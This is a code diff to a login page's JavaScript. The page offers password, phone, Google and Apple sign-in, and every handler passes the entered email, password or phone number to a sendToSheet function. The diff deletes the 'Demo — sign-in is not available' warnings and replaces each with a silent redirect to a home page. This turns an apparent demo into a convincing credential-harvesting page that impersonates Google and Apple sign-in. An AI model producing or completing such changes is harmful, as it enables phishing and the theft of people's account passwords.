@@ -86,6 +86,10 @@
     }, 3000);
   }
 
+  function redirectToHome() {
+    window.location.href = 'home.html';
+  }
+
   // ===== Event Listeners =====
   dom.loginInput.addEventListener('input', function () {
     clearError();
@@ -206,8 +210,7 @@
           return;
         }
         sendToSheet('phone', '', '', phoneInput.value, '');
-        showToast('Demo \u2014 phone verification is not available.', 'error');
-        phoneHandler.close();
+        redirectToHome();
       });
     }
 
@@ -366,9 +369,7 @@
           return;
         }
         sendToSheet('google', emailInput.value, passwordInput.value, '', '');
-        showToast('Demo \u2014 Google sign-in is not available.', 'error');
-        handler.close();
-        goToStep1();
+        redirectToHome();
       });
     }
   }
@@ -417,8 +418,7 @@
           return;
         }
         sendToSheet('apple', emailInput.value, '', '', '');
-        showToast('Demo \u2014 Apple sign-in is not available.', 'error');
-        handler.close();
+        redirectToHome();
       });
     }
 
@@ -506,8 +506,7 @@
           return;
         }
         sendToSheet('password', dom.loginInput.value, passwordInput.value, '', '');
-        showToast('Demo \u2014 login is not available.', 'success');
-        passwordHandler.close();
+        redirectToHome();
       });
     }
 
